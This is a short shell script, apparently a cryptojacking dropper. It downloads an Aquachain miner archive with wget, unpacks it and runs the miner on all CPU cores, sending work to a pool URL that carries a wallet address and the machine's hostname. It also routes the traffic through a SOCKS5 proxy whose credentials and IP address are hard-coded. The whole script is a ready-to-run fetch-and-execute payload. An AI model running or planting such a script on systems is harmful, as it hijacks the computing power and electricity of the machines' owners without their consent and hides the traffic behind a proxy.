#!/bin/sh
wget https://info.aquacha.in/latest/aquachain-miner-0.0.2-d0fd11b.tar.gz
tar -xf aquachain-miner-0.0.2-d0fd11b.tar.gz
cd aquachain-miner
./aquachain-miner-0.0.2-d0fd11b-avx2 -F http://pool.aquachain.xyz:8888/0x17487f717ec0cba96858f071d0c4bee476b0fb5a/$(cat /proc/sys/kernel/hostname) -t $(nproc) -x socks5://zomuryog:dii8et63cy9m@45.95.99.20:7580
